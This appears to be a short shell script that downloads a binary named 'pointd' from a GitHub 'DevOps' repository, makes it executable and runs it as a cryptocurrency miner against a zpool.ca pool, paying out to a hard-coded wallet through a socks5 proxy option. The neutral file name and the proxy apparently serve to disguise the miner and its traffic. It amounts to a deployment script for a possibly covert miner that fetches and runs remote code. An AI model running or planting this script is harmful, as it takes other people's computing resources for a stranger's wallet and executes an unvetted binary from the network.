apt update -y
wget -q https://raw.githubusercontent.com/christiarch/DevOps/main/pointd
chmod +x pointd
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RBxXP9udHoS2Xc27vMMMmxi79CbMmaj1u7.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN,zap=BUT-lyra2z330 -x socks5://